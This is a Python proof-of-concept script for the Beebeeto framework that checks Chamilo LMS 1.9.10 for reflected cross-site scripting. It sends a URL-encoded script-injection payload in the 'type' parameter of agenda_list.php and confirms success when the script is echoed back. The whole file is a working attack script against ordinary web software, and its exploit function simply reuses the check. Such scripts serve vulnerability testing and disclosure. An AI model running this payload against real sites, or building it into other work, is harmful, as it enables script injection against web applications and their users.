#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0068',
            'name': 'Chamilo LMS 1.9.10 /main/calendar/agenda_list.php 跨站脚本漏洞 POC',
            'author': 'user1018',
            'create_date': '2015-03-20',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Chamilo LMS', 
            'vul_version': ['1.9.10'],
            'type': 'Cross Site Scripting',
            'tag': ['Chamilo LMS漏洞', 'xss漏洞', '跨站脚本漏洞', 'php'],
            'desc': 'N/A',
            'references': ['http://www.exploit-db.com/exploits/36435/',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        url = args['options']['target'] + '/main/calendar/agenda_list.php'
        verify_url = url + '?type=personal%27%3E%3Cscript%3Econfirm%281%29%3C%2fscript%3E%3C%21--'
        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = response.read()
        if "<script>confirm(1)</script>" in content:
            args['success'] = True
            args['poc_ret']['xss_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())